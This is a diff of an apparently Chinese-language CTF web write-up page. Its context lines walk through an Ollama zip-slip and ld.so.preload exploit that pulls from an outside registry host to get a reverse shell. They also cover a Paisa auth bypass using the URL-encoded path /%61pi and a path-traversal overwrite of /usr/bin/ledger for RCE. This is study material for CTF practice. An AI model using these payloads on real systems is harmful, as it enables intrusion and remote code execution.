@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/favicon.ico">
 <meta property="article:published_time" content="2024-10-24T09:21:25.000Z">
-<meta property="article:modified_time" content="2024-10-24T16:06:50.059Z">
+<meta property="article:modified_time" content="2024-10-24T16:07:06.210Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
@@ -194,7 +194,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1729786010059"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1729786026210"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -220,7 +220,7 @@
 <p>简单地说就是利用<code>/etc/ld.so.preload</code>+任意so即可。当写入成功后需要调用<code>/api/chat</code>从而开出一个新进程触发<code>ld.so.preload</code></p>
 <p>这里<code>ld.so.preload</code>的内容就是你恶意so的路径，但是使用<code>ld.so.preload</code>会使得每次都会开一个新进程，导致直接被卡死(本地vps上试过，本地环境也试过)，导致反弹不了shell。就是差这最后一步，必须要删除<code>/etc/ld.so.preload</code>才能够正常。</p>
 <p>解决的方式就是在编写的c里面加上这一删除的过程：</p>
-<img src="/posts/undefined/1.png" class title="awa">
+<img src="/posts/49264/1.png" class title="awa">
 <p>编译成so：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC 1.c -o 1.so</span><br></pre></td></tr></table></figure>
 <p>制作zip-slip的脚本如下：</p>
@@ -233,29 +233,29 @@
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;schemaVersion&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mediaType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;application/vnd.docker.distribution.manifest.v2+json&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;digest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sha256:aa1a537b33ec6e2b5fd9b7e437228c9df7103c64868c5a7c19e095f8d33163a0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;mediaType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;application/vnd.docker.container.image.v1+json&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">455</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;layers&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;digest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sha256:5a6f2f745e489dd4dddee2369becf80a307b9ca8cc69b8dce730f5a574560c16&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;mediaType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;application/vnd.ollama.image.template&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">545</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 <p>只需修改最下面的sha256值即可，为了方便我vps里起了两个相似的文件夹，另一个写入<code>/etc/ld.so.preload</code>的不用动</p>
 <p>保证文件夹符合exp内的<code>tree</code>格式即可</p>
-<img src="/posts/undefined/2.png" class title="awa">
+<img src="/posts/49264/2.png" class title="awa">
 <p>接下来请求<code>/api</code>即可，注意对http请求要添加<code>Insecure:true</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">4. Send a /api/pull request with the malicious server parameter, this will download the evil blobs file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl http://localhost:11434/api/pull -d &#x27;&#123;</span><br><span class="line">  &quot;name&quot;: &quot;tea.trganda.top:2083/trganda/poc:latest&quot;</span><br><span class="line">&#125;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5. Send a `/api/create` request to ollama</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl http://localhost:11434/api/create -d &#x27;&#123;</span><br><span class="line">  &quot;name&quot;: &quot;poc&quot;,</span><br><span class="line">  &quot;modelfile&quot;: &quot;from @sha256:d40ad46a9b249e3eab803090ec2a51d46405a0afcbfe2a0f1ada7ac3a810f7f9&quot;</span><br><span class="line">&#125;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6. The /tmp/evil.txt file was successfully created in container</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/3.png" class title="awa">
+<img src="/posts/49264/3.png" class title="awa">
 <p>此时再申请create安装，sha256更改为恶意zip的sha256</p>
-<img src="/posts/undefined/4.png" class title="awa">
+<img src="/posts/49264/4.png" class title="awa">
 <p>此时已经安装成功，本地查看：</p>
-<img src="/posts/undefined/5.png" class title="awa">
+<img src="/posts/49264/5.png" class title="awa">
 <p>估计重施安装<code>/etc/ld.so.preload</code>即可，之后需要去<code>/api/chat</code>触发新进程，官方api里是这么调用<code>/api/chat</code>的：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:11434/api/chat -d &#x27;&#123;</span><br><span class="line">  &quot;model&quot;: &quot;mistral&quot;,</span><br><span class="line">  &quot;messages&quot;: [</span><br><span class="line">    &#123; &quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;why is the sky blue?&quot; &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure>
 <p>这里需要一个model，我们还需要去安装一个model下来，官方api内提供了一个占用很小的model——<code>all-minilm</code>，这个甚至在100M以内，所以我们能够很快地把他pull下来：</p>
-<img src="/posts/undefined/6.png" class title="awa">
-<img src="/posts/undefined/7.png" class title="awa">
+<img src="/posts/49264/6.png" class title="awa">
+<img src="/posts/49264/7.png" class title="awa">
 <p>但是这里报了个错</p>
-<img src="/posts/undefined/8.png" class title="awa">
+<img src="/posts/49264/8.png" class title="awa">
 <p>是的，这个模型不支持chat，那要怎么办呢</p>
-<img src="/posts/undefined/9.png" class title="awa">
+<img src="/posts/49264/9.png" class title="awa">
 <p>看官方api的演示，这里有个generate，说不定能靠此生成进程：</p>
-<img src="/posts/undefined/11.png" class title="awa">
+<img src="/posts/49264/11.png" class title="awa">
 <p>答案是可以的，这样shell就弹过来了，妈妈生的。</p>
-<img src="/posts/undefined/10.png" class title="awa">
+<img src="/posts/49264/10.png" class title="awa">
 <p>远程环境再复现一遍即可</p>
-<img src="/posts/undefined/12.png" class title="awa">
+<img src="/posts/49264/12.png" class title="awa">
 <p>真的是被气死了，操他妈的</p>
 <h1><span id="paisa4shell"> paisa4shell</span></h1>
 <p>这题没做，看看思路。</p>
@@ -265,48 +265,48 @@
 <p>鉴权能绕、文件覆盖</p>
 </blockquote>
 <p>首先是绕鉴权，一般都是<code>/api</code>，直接访问<code>/api</code>会报<code>Invalid token</code>，我们搜索这个错误：</p>
-<img src="/posts/undefined/13.png" class title="awa">
+<img src="/posts/49264/13.png" class title="awa">
 <p>可以看到它是这样判断的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">return func(c *gin.Context) &#123;</span><br><span class="line">		userAccounts := config.GetConfig().UserAccounts</span><br><span class="line">		if len(userAccounts) == 0 || !strings.HasPrefix(c.Request.RequestURI, &quot;/api&quot;) &#123;</span><br><span class="line">			c.Next()</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
 <p>那这个<code>c.Request.RequestURI</code>是啥呢，问问ai：</p>
-<img src="/posts/undefined/14.png" class title="awa">
+<img src="/posts/49264/14.png" class title="awa">
 <p>可以得到关键字：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用于获取原始的请求URI</span><br></pre></td></tr></table></figure>
 <p>此时如果我们将<code>/api</code>url编码的话，获取到的URI就是<code>/%61pi</code>，而不是<code>/api</code>，自然就绕过了鉴权。在<code>server.go</code>文件内有很多api接口，可以测试一下：</p>
-<img src="/posts/undefined/15.png" class title="awa">
-<img src="/posts/undefined/16.png" class title="awa">
+<img src="/posts/49264/15.png" class title="awa">
+<img src="/posts/49264/16.png" class title="awa">
 <p>可以看到确实是可以的，那前台rce又怎么来的呢，<code>前台RCE+文件覆盖</code></p>
 <p>联想到rce，我们先在文件里面搜一下有没有内置的<code>exec</code>：</p>
-<img src="/posts/undefined/17.png" class title="awa">
+<img src="/posts/49264/17.png" class title="awa">
 <p>锁定<code>ledger.go</code>并且查看：</p>
-<img src="/posts/undefined/18.png" class title="awa">
+<img src="/posts/49264/18.png" class title="awa">
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(LedgerCLI)</span></span> ValidateFile(journalPath <span class="type">string</span>) ([]LedgerFileError, <span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	errors := []LedgerFileError&#123;&#125;</span><br><span class="line"></span><br><span class="line">	ledgerPath, err := binary.LedgerBinaryPath()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> errors, <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> output, <span class="type">error</span> bytes.Buffer</span><br><span class="line">	args := []<span class="type">string</span>&#123;<span class="string">&quot;--args-only&quot;</span>&#125;</span><br><span class="line">	<span class="keyword">if</span> config.GetConfig().Strict == config.Yes &#123;</span><br><span class="line">		args = <span class="built_in">append</span>(args, <span class="string">&quot;--pedantic&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	args = <span class="built_in">append</span>(args, <span class="string">&quot;-f&quot;</span>, journalPath, <span class="string">&quot;balance&quot;</span>)</span><br><span class="line">	err = utils.Exec(ledgerPath, &amp;output, &amp;<span class="type">error</span>, args...)</span><br><span class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> errors, utils.Dos2Unix(output.String()), <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	re := regexp.MustCompile(<span class="string">`(?m)While parsing file &quot;[^&quot;]+&quot;, line ([0-9]+):\s*\n(?:(?:While|&gt;).*\n)*((?:.*\n)*?Error: .*\n)`</span>)</span><br><span class="line"></span><br><span class="line">	matches := re.FindAllStringSubmatch(utils.Dos2Unix(<span class="type">error</span>.String()), <span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, match := <span class="keyword">range</span> matches &#123;</span><br><span class="line">		line, _ := strconv.ParseUint(match[<span class="number">1</span>], <span class="number">10</span>, <span class="number">64</span>)</span><br><span class="line">		errors = <span class="built_in">append</span>(errors, LedgerFileError&#123;LineFrom: line, LineTo: line, Message: match[<span class="number">2</span>]&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> errors, <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>可以看到这里执行了<code>err = utils.Exec(ledgerPath, &amp;output, &amp;error, args...)</code></p>
 <p>相当于把这个ledge文件执行了，我们往ledge里面写内容不就可以了吗</p>
-<img src="/posts/undefined/19.png" class title="awa">
+<img src="/posts/49264/19.png" class title="awa">
 <p>可以看到<code>ledge</code>应该放在了<code>/usr/bin</code>里，名字叫<code>ledger</code></p>
 <p>覆盖这个即可，知道写什么了，那怎么调用这个函数执行呢？</p>
 <p>搜索<code>ValidateFile()</code>函数，看和api有没有联系：</p>
-<img src="/posts/undefined/20.png" class title="awa">
+<img src="/posts/49264/20.png" class title="awa">
 <p>可以看到<code>/api/editor/validate</code>调用了它</p>
 <p>问题迎刃而解，现在只剩下要怎么覆盖的问题了，看看api里有没有覆写的api吧：</p>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.POST(<span class="string">&quot;/api/editor/save&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> config.GetConfig().Readonly &#123;</span><br><span class="line">			c.JSON(<span class="number">200</span>, gin.H&#123;<span class="string">&quot;errors&quot;</span>: []ledger.LedgerFileError&#123;&#125;, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Readonly mode&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">var</span> ledgerFile LedgerFile</span><br><span class="line">		<span class="keyword">if</span> err := c.ShouldBindJSON(&amp;ledgerFile); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		c.JSON(<span class="number">200</span>, SaveFile(db, ledgerFile))</span><br><span class="line">	&#125;)</span><br></pre></td></tr></table></figure>
 <p>这个保存文件的api比较可疑：</p>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SaveFile</span><span class="params">(db *gorm.DB, file LedgerFile)</span></span> gin.H &#123;</span><br><span class="line">	errors, _, err := validateFile(file)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Validation failed&quot;</span>&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	path := config.GetJournalPath()</span><br><span class="line">	dir := filepath.Dir(path)</span><br><span class="line"></span><br><span class="line">	filePath := filepath.Join(dir, file.Name)</span><br><span class="line">	backupPath := filepath.Join(dir, file.Name+<span class="string">&quot;.backup.&quot;</span>+time.Now().Format(<span class="string">&quot;2006-01-02-15-04-05.000&quot;</span>))</span><br><span class="line"></span><br><span class="line">	err = os.MkdirAll(filepath.Dir(filePath), <span class="number">0700</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Warn(err)</span><br><span class="line">		<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to create directory&quot;</span>&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fileStat, err := os.Stat(filePath)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; file.Operation != <span class="string">&quot;overwrite&quot;</span> &amp;&amp; file.Operation != <span class="string">&quot;create&quot;</span> &#123;</span><br><span class="line">		log.Warn(err)</span><br><span class="line">		<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;File does not exist&quot;</span>&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> perm os.FileMode = <span class="number">0644</span></span><br><span class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> file.Operation == <span class="string">&quot;create&quot;</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;File already exists&quot;</span>&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		perm = fileStat.Mode().Perm()</span><br><span class="line">		existingContent, err := os.ReadFile(filePath)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Warn(err)</span><br><span class="line">			<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to read file&quot;</span>&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		err = os.WriteFile(backupPath, existingContent, perm)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Warn(err)</span><br><span class="line">			<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to create backup&quot;</span>&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = os.WriteFile(filePath, []<span class="type">byte</span>(file.Content), perm)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Warn(err)</span><br><span class="line">		<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to write file&quot;</span>&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Sync(db, SyncRequest&#123;Journal: <span class="literal">true</span>&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;file&quot;</span>: readLedgerFileWithVersions(dir, filePath)&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>尝试利用这个api写文件即可，具体怎么写呢，还是看ai：</p>
-<img src="/posts/undefined/21.png" class title="awa">
+<img src="/posts/49264/21.png" class title="awa">
 <p>也就是说我们要用json传值，且变量名和<code>LedgerFile</code>结构体内的一致：</p>
-<img src="/posts/undefined/22.png" class title="awa">
+<img src="/posts/49264/22.png" class title="awa">
 <p>肯定要传<code>name</code>和<code>content</code>的啦：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;../../../../../usr/bin/ledger&quot;, &quot;content&quot;:&quot;#!/bin/sh\nid&quot;&#125;</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/23.png" class title="awa">
+<img src="/posts/49264/23.png" class title="awa">
 <p>啊？这个api不行？那我们找一个相似的：</p>
-<img src="/posts/undefined/24.png" class title="awa">
+<img src="/posts/49264/24.png" class title="awa">
 <p>这个也是有相似功能的，写进去了：</p>
-<img src="/posts/undefined/25.png" class title="awa">
+<img src="/posts/49264/25.png" class title="awa">
 <p>访问<code>/api/editor/validate</code>触发</p>
-<img src="/posts/undefined/26.png" class title="awa">
-<img src="/posts/undefined/27.png" class title="awa">
+<img src="/posts/49264/26.png" class title="awa">
+<img src="/posts/49264/27.png" class title="awa">
 <h1><span id="ezlogin"> ezlogin</span></h1>
 <p>这个题本人觉得还是挺有意思的，知识盲区，学习了</p>
 <p>一个登录的java服务，<code>org.example.UserUtil</code>如下：</p>
@@ -441,7 +441,7 @@
                     <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2024-10-24T16:06:50.059Z" itemprop="dateModified">最后编辑：2024-10-25</time>
+                    <time datetime="2024-10-24T16:07:06.210Z" itemprop="dateModified">最后编辑：2024-10-25</time>
                 </div>
             </div>
         </footer>
